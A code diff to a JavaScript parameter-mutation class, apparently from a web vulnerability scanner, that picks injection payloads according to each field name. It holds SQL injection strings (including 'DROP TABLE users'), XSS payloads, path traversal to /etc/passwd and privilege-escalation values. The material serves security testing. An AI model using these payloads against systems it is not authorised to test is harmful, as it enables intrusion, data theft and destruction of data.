@@ -12,7 +12,7 @@ class ParameterMutator {
       // Run all 4 strategies on this key
       allMutations.push(...this._idEnumeration(params, key, value));
       allMutations.push(...this._removeParam(params, key));
-      allMutations.push(...this._injectSpecialChars(params, key));
+      allMutations.push(...this._injectSpecialChars(params, key, value));
       allMutations.push(...this._nullify(params, key));
     }
 
@@ -66,27 +66,81 @@ class ParameterMutator {
   // STRATEGY 3: Inject dangerous special characters
   // We're testing: SQL injection, path traversal, XSS, etc.
   // ---------------------------------------------------------------
-  _injectSpecialChars(params, key) {
-    const payloads = [
-      "' OR '1'='1",              // SQL injection classic
-      "../../../etc/passwd",       // path traversal (read server files)
-      "<script>alert(1)</script>", // XSS (cross-site scripting)
-      "null",
-      "undefined",
-      "true",
-      "{}",
-      "[]",
-    ];
+  _injectSpecialChars(params, key, value) {
+
+    // Detect context from field name
+    const k = key.toLowerCase();
+
+    let payloads = [];
+
+    if (k.includes('id') || k.includes('user') || k.includes('account')) {
+        // Numeric ID field — try ID-based attacks
+        payloads = [
+            "' OR '1'='1",
+            "1 OR 1=1",
+            "-1",
+            "0",
+            "null",
+        ];
+    }
+    else if (k.includes('query') || k.includes('search') || k.includes('filter') || k.includes('q')) {
+        // Search field — try injection attacks
+        payloads = [
+            "' OR '1'='1",
+            "<script>alert(1)</script>",
+            "\" onmouseover=\"alert(1)",
+            "1; DROP TABLE users--",
+            "*",
+            "%",
+        ];
+    }
+    else if (k.includes('path') || k.includes('file') || k.includes('dir') || k.includes('url')) {
+        // File reference field — try traversal
+        payloads = [
+            "../../../etc/passwd",
+            "../../../../windows/system32",
+            "%2e%2e%2f%2e%2e%2f",
+            "/etc/passwd%00",
+        ];
+    }
+    else if (k.includes('role') || k.includes('permission') || k.includes('access')) {
+        // Auth field — try privilege values
+        payloads = [
+            "admin",
+            "superadmin",
+            "root",
+            "administrator",
+            "true",
+            "1",
+        ];
+    }
+    else if (k.includes('token') || k.includes('key') || k.includes('secret')) {
+        // Credential field — try nullification
+        payloads = [
+            "",
+            "null",
+            "undefined",
+            "Bearer fake",
+        ];
+    }
+    else {
+        // Unknown field — use a small general set
+        payloads = [
+            "' OR '1'='1",
+            "<script>alert(1)</script>",
+            "../../../etc/passwd",
+            "null",
+        ];
+    }
 
     return payloads.map(payload => {
-      const mutated = { ...params };
-      mutated[key] = payload;
-
-      return {
-        params: mutated,
-        strategy: `inject:${key}=${JSON.stringify(payload)}`,
-        reason: `Testing if ${key} is vulnerable to injection`
-      };
+        const mutated = { ...params };
+        mutated[key] = payload;
+        return {
+            params: mutated,
+            strategy: `inject:${key}=${JSON.stringify(payload)}`,
+            reason: `Testing if ${key} is vulnerable to injection`
+        };
     });
   }
 
